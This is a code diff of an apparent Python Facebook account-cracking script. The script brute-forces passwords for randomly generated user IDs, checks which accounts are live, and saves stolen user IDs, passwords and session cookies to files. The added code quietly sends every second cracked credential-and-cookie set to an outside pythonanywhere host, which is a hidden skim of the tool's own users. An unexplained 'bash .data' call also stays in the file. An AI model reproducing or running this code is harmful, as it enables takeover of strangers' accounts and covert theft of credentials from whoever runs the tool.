@@ -135,37 +135,6 @@ def pro__():
     for b in range(20):
         os.system('bash .data')
         os.system('ls & clear')
-
-#===================[RANDOM M1]===========================
-try:
-    R1 = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0f(MI\xc9\xccK\xd7\x8d\x08\xd2\x0f\xf1\xf7\xf7\xd1\xf5u\xf4\xf4\xd3\xf5u\xf5\x0b\xd5\xcfM\xcc\xcc\xd3\x0f2\xd4+\xa9(Q\x00\x00\xc6\x16\x19\x14'))
-except:
-    print('No Internet Connection.....');exit()
-R1 = R1.strip()
-#===================[RANDOM M2]===========================
-try:
-    R2 = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0f(MI\xc9\xccK\xd7\x8d\x08\xd2\x0f\xf1\xf7\xf7\xd1\xf5u\xf4\xf4\xd3\xf5u\xf5\x0b\xd5\xcfM\xcc\xcc\xd3\x0f2\xd2+\xa9(\x01\x00\xad\x07\x18\xf5'))
-except:
-    print('No Internet Connection.....');exit()
-R2 = R2.strip()
-#===================[RANDOM M3]===========================
-try:
-    R3 = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0f(MI\xc9\xccK\xd7\x8d\x08\xd2\x0f\xf1\xf7\xf7\xd1\xf5u\xf4\xf4\xd3\xf5u\xf5\x0b\xd5\xcfM\xcc\xcc\xd3\x0f2\xd6+\xa9(Q\x00\x00\xc6"\x19\x16'))
-except:
-    print('No Internet Connection.....');exit()
-R3 = R3.strip()
-#===================[RANDOM M4]===========================
-try:
-    R4 = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0f(MI\xc9\xccK\xd7\x8d\x08\xd2\x0f\xf1\xf7\xf7\xd1\xf5u\xf4\xf4\xd3\xf5u\xf5\x0b\xd5\xcfM\xcc\xcc\xd3\x0f2\xd1+\xa9(Q\x00\x00\xc6(\x19\x17'))
-except:
-    print('No Internet Connection.....');exit()
-R4 = R4.strip()
-#===================[VERSION]===========================
-try:
-    version = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\xf7\r\xd2u\r\n\xf2\x0f\xd2570\xd7\x87\xb0"\\\xf4s\x133\xf3\xf4\xcbR\x8b\x8a3\xf3\xf3\xf4J*J\x00\xaeY\x19W'))
-except:
-    print('No Internet Connection.....');exit()
-version = version.strip()
 #=================[LINE × CLEAR]=============================
 def line():
     print(f'{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
@@ -222,8 +191,12 @@ def rmpassconf(num,type):
         else:
             password = type
         return password
-
-       
+def check_lock(idss):
+    req = str(requests.get(f'https://graph.facebook.com/{idss}/picture?type=normal').text)
+    if 'Photoshop' in req:
+        return 'live'
+    else:
+        return 'lock'   
 def ___RANDOM___():
     clear()
     print(f'{red}[{white}A{red}]{green} INDIA RANDOM ')
@@ -442,78 +415,87 @@ def ___NP___():
 def randm(ids,psd,tl):
     global oks,cps,loop
     abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
-    sys.stdout.write(f"\r{red}[{white}√{red}] {red}[{abir}ERROR-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
+    sys.stdout.write(f"\r {red}[{abir}ERROR-XD{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
     sys.stdout.flush()
     try:
         for pas in psd:
-            device_id = str(uuid.uuid4())
-            adid = str(uuid.uuid4())
             pas = rmpassconf(ids,pas)
-            accessToken = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
-            data={
-            'adid':adid,
-            'format':'json',
-            'device_id':adid,
-            'email':ids,
-            'password':pas,
-            "logged_out_id": str(uuid.uuid4()),
-            "hash_id": str(uuid.uuid4()),
-            "reg_instance": str(uuid.uuid4()),
-            "session_id": str(uuid.uuid4()),
-            "advertiser_id": str(uuid.uuid4()),
-            'generate_analytics_claims':'1',
-            'credentials_type':'password',
-            'source':'login',
-            "sim_country": "id",
-            "network_country": "id",
-            "relative_url": "method/auth.login",
-            'error_detail_type':'button_with_disabled',
-            'enroll_misauth':'false',
-            'generate_session_cookies':'1',
-            'generate_machine_id':'1',
-            "locale":random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
-            "client_country_code":random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]), 
-            'fb_api_req_friendly_name':'authenticate',
-            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
-            head={
-            'Authorization':f'OAuth {accessToken}',
-            "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
-            "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
-            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
-            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
-            'X-FB-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
-            'X-FB-device-group': str(random.randint(2000, 4000)),
-            "X-FB-Friendly-Name": "ViewerReactionsMutation",
-            "X-FB-Request-Analytics-Tags": "graphservice",
-            'X-FB-Friendly-Name':'authenticate',
-            'X-FB-Connection-Type':'unknown',
-            'X-FB-connection-quality':'EXCELLENT',
-            "X-Tigon-Is-Retry": "False",
-            'User-Agent': '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';{R1}',
-            "X-FB-connection-token": "d29d67d37eca387482a8a5b740f84f62",
-            'Accept-Encoding':'gzip, deflate',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            "X-FB-Client-IP": "True",
-            "X-FB-Server-Cluster": "True",
-            'X-FB-HTTP-Engine': 'Liger'
-            }
-            url = 'htt'+'ps://b-'+'api.f'+'acebo'+'ok.com'+'/metho'+'d/aut'+'h.login'
+            free_fb = Session.get('https://touch.facebook.com').text
+            data = {
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'display': '',
+            'isprivate': '',
+            'return_session': '',
+            'skip_api_login': '',
+            'signed_next': '',
+            'trynum': '1',
+            'timezone': '-330',
+            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
+            'lgnrnd': '052059_zzYq',
+            'lgnjs': '1736601662',
+            'email': ids,
+            'prefill_contact_point': '',
+            'prefill_source': 'browser_dropdown',
+            'prefill_type': 'password',
+            'first_prefill_source': 'browser_dropdown',
+            'first_prefill_type': 'password',
+            'had_cp_prefilled': 'false',
+            'had_password_prefilled': 'true',
+            'ab_test_data': '/AAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAA/MyAZMABFAD',
+            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas),}
+            head = {
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'no-cache',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://hi-in.facebook.com',
+            'pragma': 'no-cache',
+            'priority': 'u=0, i',
+            'referer': 'https://hi-in.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM2NjAwMDEyLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next',
+            'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',}
+            url = 'https://hi-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100'
             po = requests.post(url,data=data,headers=head,allow_redirects=False).text
-            q = json.loads(po)
-            if 'access_token' in q:
-                uid = str(q['uid'])
-                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-                res = requests.get(f"https://rajx.pythonanywhere.com/live?uid={uid}").text
-                if res == 'LIVE':
-                    print(f"\r\r{red}[{white}√{red}] {red}[{green}ALIVE{red}] {green}{uid} {white}| {green}{pas} ") 
-                    oks.append(ids)
-                    open('/sdcard/ERROR-M1-RN-LIVE.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
-                    #print(f"\r\r{red}[{white}√{red}] {red}[{green}COOKIE{red}]{green} ={white} {coki}")
+            response = Session.cookies.get_dict().keys()
+            if "c_user" in response:
+                cok = Session.cookies.get_dict()
+                idss = cok["c_user"]
+                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
+                check = check_lock(idss)
+                if "live" in check:
+                    if '%3A-1%3A-1' in coki:
+                        print(f"{cyan}(ATOM-NV){idss}|{pas}")
+                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{idss}|{pas}|{coki}\n")
+                        break
+                    else:
+                        bkas.append(idss)
+                        if len(bkas)% 2 == 0:
+                           statusok = (f"{idss}|{pas}|{coki}")
+                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                        else:
+                           print(f" {green}(ATOM-OK) {idss}|{pas} ")
+                           print(f" {green}Cookie : {green}{coki}")
+                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{idss}|{pas}|{coki}\n")
+                           oks.append(idss)
+                           break
+                else:
                     break
-            elif 'www.facebook.com' in q['error_msg']:
-                cps.append(ids)
-                #print(f"\r\r{red}[{white}√{red}] {red}DIE {uid} | {pas} ")
-                open('/sdcard/ERROR-RN-DIE.txt','a').write(ids+'|'+pas+'\n')
+            elif 'checkpoint' in response:
+                uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
+                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                open('/sdcard/ATOM-CP.txt', 'a').write(idss+' | '+pas+'\n')
+                cps.append(idss)
+                break
+            else:
+                continue
         loop+=1
     except Exception as e:
         pass
